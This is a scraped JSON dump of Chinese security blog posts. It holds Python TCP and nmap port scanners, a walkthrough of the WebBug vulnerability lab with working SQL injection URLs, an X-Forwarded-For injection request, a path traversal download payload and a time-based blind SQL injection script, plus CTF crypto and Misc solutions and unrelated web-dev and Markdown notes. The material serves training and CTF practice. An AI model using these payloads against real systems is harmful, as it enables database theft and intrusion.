2017-04-07 用pyhon进行渗透测试2.1 编写端口扫描2.1.1 TCP全连接扫描 TCP 全连接扫描：socket 和 optpares 1234socket.gethostbyname(hostname) \\\\socket.gethostbyaddr(ip addreess) \\\\socket.socket(\\[family\\[,type\\[,proto]]])\\\\socket.create_connection(addrees\\[,timeout\\[,surece_address]]) ​ optparse 模块是python的内建模块应用于处理命令行。 123456789101112from optparse import OptionParser [...] parser = OptionParser() parser.add_option(&quot;-f&quot;, &quot;--file&quot;, dest=&quot;filename&quot;, help=&quot;write report to FILE&quot;, metavar=&quot;FILE&quot;) parser.add_option(&quot;-q&quot;, &quot;--quiet&quot;, action=&quot;store_false&quot;, dest=&quot;verbose&quot;, default=True, help=&quot;don&apos;t print status messages to stdout&quot;) (options, args) = parser.parse_args() 12345678故命令行可以使用：usage: &lt;yourscript&gt; [options] options: -h, --help show this help message and exit -f FILE, --file=FILE write report to FILE -q, --quiet don&apos;t print status messages to stdout 12 2.2.2 抓取应用的Banner2.2.3 线程扫描python-nmap 利用python 调用nmap 1234567TCP SYN 扫描 ：又称为半开放扫描，这种类型的扫描发送一个SYN的TCP连接数包等待响应，当返回RST数据包表示端口关闭，返回ACK数据包表示端口开放。TCP NULL 扫描 ：TCP空扫描设置TCP的标志头为零。如果返回一个RST数据包则表示这个端口是关闭的。TCP FIN 扫描 : TCP FIN扫描发送一个FIN数据包，主动关闭连接，等待一个圆满的终止，如果返回RST数据包则表示端口是关闭的。TCP XMAS 扫描 ：TCP XMAS扫描设置 PSH, FIN,和URG TCP标志位，如返回RST数据包则表示这个端口是关闭的。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162# -*- coding:utf-8 -*-# -*- by shackle -*-# 输入主机名与端口-&gt;主机名变为IPV4地址-&gt;import optparseimport socketimport threading#### 建立socket连接def connScan(tgtHost,tgtPort): try: connSkt = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connSkt.connect((tgtHost,tgtPort)) print &apos;[+]%d/tcp open&apos;%tgtPort connSkt.close() except: print &apos;[-]%d/tcp closed &apos;% tgtPort## 定义端口扫描函数def portScan(tgtHost, tgtPorts): try: tgtIP = socket.gethostbyname(tgtHost) except: print &quot;[-] Cannot resolve &apos;%s&apos;: Unknown host&quot; % tgtHost return try: tgtName = socket.gethostbyaddr(tgtIP) print &apos;\\n[+] Scan Results for: &apos; + tgtName[0] except: print &apos;\\n[+] Scan Results for: &apos; + tgtIP socket.setdefaulttimeout(1) ### 多线程，多端口 for tgtPort in tgtPorts: print(&apos;Scanning port &apos; + str(tgtPort)) t = threading.Thread(target=connScan, args=(tgtHost, int(tgtPort))) t.start()def main(): parser = optparse.OptionParser(&apos;use: –H &lt;target host&gt; -P &lt;target port&gt;&apos;) # 新建paser对象 parser.add_option(&apos;-H&apos;, &apos;--host&apos;, dest=&apos;tgtHost&apos;, type=&apos;string&apos;, help=&apos;taget host&apos;) parser.add_option(&apos;-P&apos;, &apos;--port&apos;, dest=&apos;tgtPort&apos;, type=&apos;int&apos;, help=&apos;taget port&apos;) (options, args) = parser.parse_args() # 已经定义好了所有的命令行参数，调用 parse_args() 来解析程序的命令行： # options，它是一个对象（optpars.Values），保存有命令行参数值。只要知道命令行参数名，如 file，就可以访问其对应的值： options.file 。 # args，它是一个由 positional arguments 组成的列表。 tgtHost = options.tgtHost tgtPort = options.tgtPort args.append(tgtPort) # 设置端口列表 if (tgtHost == None) | (tgtPort == None): print parser.usage exit(0) portScan(tgtHost,args)if __name__ == &apos;__main__&apos;: main() 2.2.4 利用NMAP12345678910111213141516171819202122232425262728# -*- coding:utf-8 -*-# -*- by shackle -*-\\# 调用 nmapimport optparseimport nmapdef nmapScan(tgtHost, tgtPort): nmScan = nmap.PortScanner() results = nmScan.scan(tgtHost, tgtPort) state = results[&apos;scan&apos;][tgtHost][&apos;tcp&apos;][int(tgtPort)][&apos;state&apos;] print(&quot; [*] &quot; + tgtHost + &quot; tcp/&quot; + tgtPort + &quot; &quot; + state)def main(): parser = optparse.OptionParser(&apos;usage %prog –H &lt;target host&gt; -P &lt;target port&gt;&apos;) parser.add_option(&apos;-H&apos;, dest=&apos;tgtHost&apos;, type=&apos;string&apos;, help=&apos;specify target host&apos;) parser.add_option(&apos;-P&apos;, dest=&apos;tgtPort&apos;, type=&apos;string&apos;, help=&apos;specify target port&apos;) (options, args) = parser.parse_args() tgtHost = options.tgtHost tgtPort = options.tgtPort args.append(tgtPort) if (tgtHost == None) | (tgtPort == None): print(&apos;[-] You must specify a target host and port[s]!&apos;) exit(0) for tgport in args: nmapScan(tgtHost, tgport)if __name__ == &apos;__main__&apos;: main()","categories":[],"tags":[{"name":"Python","slug":"Python","permalink":"https://shackles.top/tags/Python/"}]},{"title":"国产Webbug开源漏洞平台","slug":"webbug","date":"2017-04-05T15:53:56.000Z","updated":"2018-03-31T14:15:43.733Z","comments":true,"path":"2017/04/05/webbug/","link":"","permalink":"https://shackles.top/2017/04/05/webbug/","excerpt":"","text":"国产的Webbug开源漏洞平台搞一下~ get注入图片破解信息收集练习——目录端口收集暴力破解练习x-forwarded-for注入支付漏洞垂直越权CSRFurl跳转GET任意文件下载POST任意文件下载无验证上传反射型XSS存储型XSS校验扩展名上传验证来源去向的url跳转文件包含POST文件包含HOST注入APK破解延时注入DZ7.2论坛sql注入aspcms注入phpmyadmin任意文件包含漏洞齐博系统SQL注入海盗云商getshellPHP168任意代码执行GET SHELLecshop 注入ShopXp系统SQL注射漏洞Dcore(轻型CMS系统)注入漏洞MetInfo 任意文件包含漏洞可getshellMetinfo news.php盲注Metinfo img.php盲注万众电子期刊在线阅读系统PHP和ASP最新版本通杀SQL注入BEESCMS sql注入，无视防御ourphp 注入phpwind 命令执行漏洞metinfo 任意用户密码修改DZ 3.2 存储型XSSDedeCMS flink.php友情链接注入DedeCms?recommend.php注入BEESCMS 小于等于V4四处注入+无需密码直接进后台海洋 x-forwarded-for注入php截断利用st2-016jboss命令执行tomcat弱口令hfs远程命令执行st2-052命令执行flash远程命令执行gh0st远程溢出IIS6.0远程溢出 渗透基础第一关:get注入__很简单的一个注入GET 手工注入/sqlmap 1、爆列长 order by 4 为1http://10.102.15.214/pentest/test/sqli/sqltamp.php?gid=1' order by 4 %23 回显：不爆错，所以列长是4。 2、爆表 mysql information_schema 元信息表 1http://10.102.15.214/pentest/test/sqli/sqltamp.php?gid=1' union select group_concat(table_name),2,3,4 from information_schema.tables where table_schema = database() %23 回显：comment,flag,goods,user 四个表 3、爆列 1http://10.102.15.214/pentest/test/sqli/sqltamp.php?gid=1' union select group_concat(column_name),2,3,4 from information_schema.columns where table_name = 'flag' %23 回显：id,flag flag表中的列 4、查询flag值 1http://10.102.15.214/pentest/test/sqli/sqltamp.php?gid=1' union select 1,flag,3,4 from flag %23 回显：名称为:204f704fbbcf6acf398ffee11989b377 第二关:从图片中你能找到什么？图片隐写题目 ， 想想之前misc 题目做的想吐。 第三关:你看到了什么？扫目录。。。emmm 第四关:告诉你了flang是5位数http://10.102.15.214/pentest/test/b2e16da5985ee1be/index.html bp 抓包爆破弱口令。 admin admin 123 第五关:一个优点小小的特殊的注入XFF 头注入 浅谈http头注入(附案例)https://zhuanlan.zhihu.com/p/27553821 User-Agent：使得服务器能够识别客户使用的操作系统，游览器版本等.（很多数据量大的网站中会记录客户使用的操作系统或浏览器版本等存入数据库中） Cookie：网站为了辨别用户身份、进行 session 跟踪而储存在用户本地终端上的数据（通常经过加密）. X-Forwarded-For：简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP,（通常一些网站的防注入功能会记录请求端真实IP地址并写入数据库or某文件[通过修改XXF头可以实现伪造IP]）. Clien-IP：同上，不做过多介绍. Rerferer：浏览器向 WEB 服务器表明自己是从哪个页面链接过来的. Host：客户端指定自己想访问的WEB服务器的域名/IP 地址和端口号(这个我本人还没碰到过，不过有真实存在的案例还是写上吧). 123456789101112GET /pentest/test/1/ HTTP/1.1Host: 10.102.15.214User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: HFS_SID_=0.630969217978418Content-Length: 0X-Forwarded-For:union select 1,flag,3,4 from flagConnection: closeUpgrade-Insecure-Requests: 1Cache-Control: max-age=0 第六关:这关需要rmb购买哦截获数据包进行修改数量 逻辑漏洞 第七关:越权越权修改密码 http://10.102.15.214/pentest/test/3/change.php?name=admin 第八关:CSRF将更改密码的请求用Burpsuite截获 可一键生成CSRF PoC 第九关:URL跳转http://10.102.15.214/pentest/test/5/index.php?url=http://www.baidu.com 第十关:文件下载http://10.102.15.214/pentest/test/6/1/download.php 任意文件下载 payload： 下载 config.php http://10.102.15.214/pentest/test/6/1/download.php?fname=../../..//pentest/test/6/1//db/config.php 第十一关:我和上一题有点像的确和上一关有点像 也是要找回mysql账号密码 还是先把下载的包抓下来看看 上一关的下载用的是get 本关用的post 第十二关:我系统密码忘记了！​ 上传漏洞的连接菜刀。 第十三关:XSS反射型 xss http://10.102.15.214/pentest/test/9/?id= 第十四关:存储型XSS 第十五关:什么？图片上传不了？只验证了Content-Type 抓包改。。。 第十六关:明天双十一中级进阶第一关:出来点东西吧 任意文件读取get 方式文件包含漏洞 http://10.102.94.210/pentest/test/13/?country=../../../index.html 第二关:提交方式是怎么样的啊？http://10.102.94.210/pentest/test/14/ post 方式文件 文件包含漏洞 第三关:我还是一个注入host 头注入 第四关:APK里面有一个flag逆向APK程序 第五关:时间注入http://10.102.94.210/pentest/test/time/ 12345678910111213141516171819202122232425262728293031#encoding=utf-8 #时间盲注脚本import requestsimport timepayloads = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM0123456789@_.&#125;&#123;,'#存放跑出的结果length=0database=''table=''print 'start get length...'for l in range(1,21): startTime1=time.time() url1 = \"http://192.168.37.147/pentest/test/time/?type=1 and if(length(database())=%d,sleep(5),1)\"%(l) response1 = requests.get(url1) if time.time() - startTime1 &gt; 5: length=l print \"the length is \" + str(length) breakprint 'start database sql injection...'for d in range(1,length+1): for payload in payloads: startTime2=time.time() url2 = \"http://192.168.37.147/pentest/test/time/?type=1 and if(substr(database(),'%d',1)='%s',sleep(5),1)\"%(d,payload) response2 = requests.get(url2) #发送请求 if time.time() - startTime2 &gt; 5: #判断是否延时了5秒 也就是 是否执行了函数sleep(5) database+=payload print database breakprint \"the database is \" + database 实战练习:DZ论坛dz7.2 实战练习:aspcms实战练习:phpmyadmin实战练习:齐博系统实战练习:海盗云商实战练习:PHP168 6.0实战练习:ecshop实战练习:ShopXp系统v3.x实战练习:Dcore(轻型CMS系统)实战练习:MetInfo 5.1.7实战练习:Metinfo 5.3MetInfo 5.3 /include/global/listmod.php SQL 注入漏洞: 实战扩展漏洞知识","categories":[],"tags":[{"name":"渗透","slug":"渗透","permalink":"https://shackles.top/tags/渗透/"}]},{"title":"CTF-密码学总结","slug":"CTF-密码学总结","date":"2017-03-02T15:53:56.000Z","updated":"2018-03-29T23:24:54.339Z","comments":true,"path":"2017/03/02/CTF-密码学总结/","link":"","permalink":"https://shackles.top/2017/03/02/CTF-密码学总结/","excerpt":"","text":"CTF-密码学总结 2016-11-08 密码学 CryptoAlice 与 Bob密码体质的定义：密码学5元组秘钥量 对称密码与非对称密码（公钥与私钥）； 密码分析的分类1、穷举攻击2、统计分析攻击3、数学分析攻击 唯密文攻击； 已知明文攻击； 选择明文攻击； 选择密文攻击； 密码体制的安全性计算安全性；可证明安全性；无条件安全性； 古典密码学1、单表代换加密明文与密文一一对应；2、多表代换加密已知加密算法破解； 现代密码对称密码的设计原理： 密文的统计特性与使用的密钥独立； DES分组加密算法 ，密钥长度56位；（每个第8位作为奇偶校验位） AESRC5分组密码的加密的模式： 零知识证明 http://quipqiup.com/ 词频分析 md5解密 www.dmd5.com http://www.dmd5.com/","categories":[],"tags":[]},{"title":"MEAN--全栈WEB开发框架","slug":"MEAN--全栈WEB开发框架","date":"2016-11-29T15:53:56.000Z","updated":"2018-03-29T23:25:48.530Z","comments":true,"path":"2016/11/29/MEAN--全栈WEB开发框架/","link":"","permalink":"https://shackles.top/2016/11/29/MEAN--全栈WEB开发框架/","excerpt":"","text":"MEAN–全栈WEB开发框架 2016-12-01 MEAN Mongode + Express + Angular + Node.js ##全Javascript的开发架构MEAN。js语言运行在应用程序的所有层次上，前端后端服务端从客户端到服务器，再到持久层一种语言运行在应用程序的所有层次上。 (M)MongoDB——NoSQL的文档数据库，使用JSON风格来存储数据，查询较简单，甚至也是使用JS来进行sql查询；m (E)Express——较好的基于Node的Web开发框架，是一个最小的，灵活的Node.js Web应用程序框架，构建单页和多页，和混合Web应用程序提供了一套强大的功能； (A)Aagular——JS的前端开发框架，提供了声明式的双向数据绑定；A (N)Node——跑在服务器的js，并发 异步 事件驱动，基于V8的运行时环境（JS语言开发），可以构建快速响应、可扩展的网络应用。n 1.架构框图采用MVC架构。模型-视图-控制器 (MVC) 可以直接存储JSON格式的mongoDB数据库， 1. 从 LAMP 到 MEANMEAN 不仅仅是一次首字母缩写的简单重新安排与技术升级。将基础平台从操作系统 (Linux) 转变为 JavaScript 运行时 (Node.js) 让操作系统变得独立：Node.js 在 Windows® 与 OS X 上的运行情况和在 Linux 上一样优秀。跨平台强。 - 1.1Node.js 同样取代了 LAMP 堆栈中的 Apache。但 Node.js 远远不止是一种简单的 Web 服务器。事实上，用户不会将完成后的应用程序部署到单机的 Web 服务器上；相反，Web 服务器已经包含在应用程序中，并已在 MEAN 堆栈中自动安装。结果，部署过程得到了极大简化，因为所需的 Web 服务器版本已经与余下的运行时依赖关系一起得到了明确定义。 - 1.2从传统数据库（如 MySQL）–&gt;非关系数据库 (如NoSQL）–&gt;无架构的、以文档为导向的持久存储（如 MongoDB），这些代表着持久化策略发生了根本性的转变。用户花费在编写 SQL 上的时间将会减少，将会有更多的时间编写 JavaScript 中的映射/化简功能。用户还能省掉大量的转换逻辑，因为 MongoDB 可以在本地运行 JavaScript Object Notation (JSON)。因此，编写 RESTful Web 服务变得前所未有的容易。 从 LAMP 到MEAN的最大转变在于从传统的服务器端页面生成变为客户端 单页面应用程序 (SPA)。借助 Express仍然可以处理服务器端的路由与页面生成，但目前的重点在客户端视图上，而 AngularJS 可以实","categories":[],"tags":[]},{"title":"简单强大的Markdown","slug":"简单强大的Markdown","date":"2016-10-19T15:53:56.000Z","updated":"2018-03-30T03:20:51.528Z","comments":true,"path":"2016/10/19/简单强大的Markdown/","link":"","permalink":"https://shackles.top/2016/10/19/简单强大的Markdown/","excerpt":"","text":"简单强大的Markdown 2016-06-27 简单强大的MarkdownMarkdown是一种可以使用普通文本编辑器编写的标记语言，通过简单的标记语法，它可以使普通文本内容具有一定的格式。是一种方便记忆、书写的纯文本标记语言，用户可以使用这些标记符号以最小的输入代价生成极富表现力的文档：譬如您正在阅读的这份文档。它使用简单的符号标记不同的标题，分割不同的段落，粗体 或者 斜体 某些文字，更棒的是，它还可以 1. 制作一份待办事宜 Todo 列表 支持以 PDF 格式导出文稿 改进 Cmd 渲染算法，使用局部渲染技术提高渲染效率 新增 Todo 列表功能 修复 LaTex 公式渲染问题 新增 LaTex 公式编号功能 2. 书写一个质能守恒公式[^LaTeX]E=mc2E=mc2 3. 高亮一段代码[^code]1234567@requires_authorizationclass SomeClass: passif __name__ == &apos;__main__&apos;: # A comment print &apos;hello world&apos; 4. 高效绘制 流程图123456789flowst=&gt;start: Startop=&gt;operation: Your Operationcond=&gt;condition: Yes or No?e=&gt;endst-&gt;op-&gt;condcond(yes)-&gt;econd(no)-&gt;op 5. 高效绘制 序列图123Alice-&gt;Bob: Hello Bob, how are you?Note right of Bob: Bob thinksBob--&gt;Alice: I am good thanks! 6. 高效绘制 甘特图12345678910111213title 项目开发流程section 项目确定 需求分析 :a1, 2016-06-22, 3d 可行性报告 :after a1, 5d 概念验证 : 5dsection 项目实施 概要设计 :2016-07-05 , 5d 详细设计 :2016-07-08, 10d 编码 :2016-07-15, 10d 测试 :2016-07-22, 5dsection 发布验收 发布: 2d 验收: 3d 7. 绘制表格 项目 价格 数量 计算机 $1600 5 手机 $12 12 管线 $1 234","categories":[],"tags":[{"name":"other","slug":"other","permalink":"https://shackles.top/tags/other/"}]},{"title":"实验吧Misc题目","slug":"实验吧Misc题目","date":"2016-10-05T15:53:56.000Z","updated":"2018-03-29T23:20:11.646Z","comments":true,"path":"2016/10/05/实验吧Misc题目/","link":"","permalink":"https://shackles.top/2016/10/05/实验吧Misc题目/","excerpt":"","text":"实验吧Misc题目 2016-10-08 1、 这就是一个坑QUESTION: 密码是十位大小写字母、数字、特殊符号组成的，你爆破的开么？ TIP: ARCHPR对flag.zip进行明文攻击,CRP相同。 ANSWER: 我们打开压缩包的tips.txt，里面提示：密码是十位大小写字母、数字、特殊符号组成的，你爆破的开么？！这个tip告诉我们爆破是基本不可能了然后我们发现falg.zip里面也有个tips.txt，然后我猜想flag.zip里面的tips.txt和另外一个tips.txt是不是同一个文件然后把tips.txt压缩后可以发现，他们两个的crc32是一样的. 2、CheatEngineQUESTION: TIP: CE工具的使用，Cheat Engine 是一款内存修改编辑工具 ，它允许你修改你的游戏或软件内存数据，以得到一些其他功能。它包括16进制编辑，反汇编程序，内存查找工具。与同类修改工具相比，它具有强大的反汇编功能，且自身附带了外挂制作工具，可以用它直接生成外挂。 ANSWER:link 4、 图片里的动漫QUESTION: 一恒河沙中有三千世界，一张图里也可以有很多东西。答案是与一部动漫名字有关的小写英文字母。 TIP: 遇见此类型的题先binwak， 再 foremost； 文件隐藏，根据文件头判断。file命令; ANSWER: 6、CanonQUESTION: TIP: mp3文件和一个加密过的zip ，上MP3stego；MP3stego加密mp3，需要秘钥即为题目Cannon；得到base64，解密的CTF{}。 1Decode.exe -X -P Canon music.mp3 // 解密； ANSWER: 7、ROT-13变身了QUESTION: 提示：1、回旋13，回不回？ 2、有81,450,625种可能性 格式：flag{}破解下面的密文： 83 89 78 84 45 86 96 45 115 121 110 116 136 132 132 132 108 128 117 118 134 110 123 111 110 127 108 112 124 122 108 118 128 108 131 114 127 134 108 116 124 124 113 108 76 76 76 76 138 23 90 81 66 71 64 69 114 65 112 64 66 63 69 61 70 114 62 66 61 62 69 67 70 63 61 110 110 112 64 68 62 70 61 112 111 112 flag格式flag{} TIP: ROT13：只对字母进行编码，用当前字母往前数的第13个字母替换当前字母，例如当前为A，编码后变成N，当前为B，编码后变成O，以此类推顺序循环。先对每个数字减去13后，再chr（）转换成字符. ANSWER: 12345# rot13 -13 chr() 字符# -*- coding: utf-8 -*-lst=[83,89,78,84,45,86,96,45,115,121,110,116,136,132,132,132,108,128,117,118,134,110,123,111,110,127,108,112,124,122,108,118,128,108,131,114,127,134,108,116,124,124,113,108,76,76,76,76,138,23,90,81,66,71,64,69,114,65,112,64,66,63,69,61,70,114,62,66,61,62,69,67,70,63,61,110,110,112,64,68,62,70,61,112,111,112] lst=[chr(i-13) for i in lst] print &quot;&quot;.join(lst) 这样就会得到FLAG IS flag{www_shiyanbar_com_is_verygood????}MD5:38e4c352809e150186920aac37190cbc 123456789101112131415161718# -*- coding: utf-8 -*-#根据MD5爆破后四位import hashliba = &apos;38e4c352809e150186920aac37190cbc&apos;dic = r&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&amp;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~ &quot;for i1 in dic: for i2 in dic: for i3 in dic: for i4 in dic: md5 = hashlib.md5() b = &apos;flag&#123;www_shiyanbar_com_is_very_good_&apos; +i1+i2+i3+i4+&apos;&#125;&apos; md5.update(b) if md5.hexdigest() == a: print &apos;%s %s&apos; %(md5.hexdigest(),b) 得flag{www_shiyanbar_com_is_verygood@8Mu} 8、解码磁带QUESTION: http://ctf5.shiyanbar.com/misc/cidai.html TIP: ANSWER: 9、功夫秘籍QUESTION: TIP:.png文件，找到key is VF95c0s5XzVyaGtfX3VGTXR9M0Vse251QEUg base64：T_ysK9_5rhk__uFMt}3El{nu@E //base64 为36位，这是个坑。解出来加上空格。 栅栏：3位 Th3_kEyls{Kun9Fu_M@5tEr} ANSWER:Kun9Fu_M@5tEr 提交这个； ==10、WTF==QUESTION: http://ctf5.shiyanbar.com/423/misc/code.txt通过奇怪的字符串发现其中隐藏的信息 TIP: ANSWER: 12、==有趣的文件==QUESTION:这是一个有趣的文件，打开看看你能想到什么格式：CTF{ }解题链接： http://ctf5.shiyanbar.com/misc/funfileTIP: ANSWER:http://www.shiyanbar.com/ctf/writeup/513 QUESTION: TIP: ANSWER: 13、PaintQUESTION:matplotlib画图TIP: ANSWER: ### QUESTION: TIP: ANSWER: ### QUESTION: TIP: ANSWER: ### QUESTION: TIP: ANSWER: QUESTION: TIP: ANSWER:","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://shackles.top/tags/CTF/"}]}]}